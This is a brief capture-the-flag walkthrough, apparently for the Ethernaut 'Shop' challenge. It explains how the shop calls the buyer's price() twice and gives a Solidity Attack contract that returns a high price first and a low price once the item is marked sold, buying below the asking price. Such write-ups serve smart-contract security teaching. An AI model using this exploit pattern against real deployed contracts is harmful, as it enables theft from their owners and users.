## Shop

1. This is similar to Elevator where you call the contract and it calls back to your contract (obviously you have to use contract).

2. We have to buy with less price, actually i tried to return pure function with 99 price in my Attack contract but require check failed it and then i looked closely and realized something.

3. The price() is called twice in the buy(), first time it should return more than or equal to 100 and for second call it should return less than 100 to pass the challenge.

4. You can do it in various ways but i used ternary op similar to python

5. you have to add the interface for shop, below is the code

```solidity
contract Attack {
    Shop private shop;

    function attack(Shop _shop) external {
        shop = _shop;
        shop.buy();
    }

    function price() external view returns (uint256) {
        return shop.isSold() ? 1 : 101;
    }
}
```

6. success
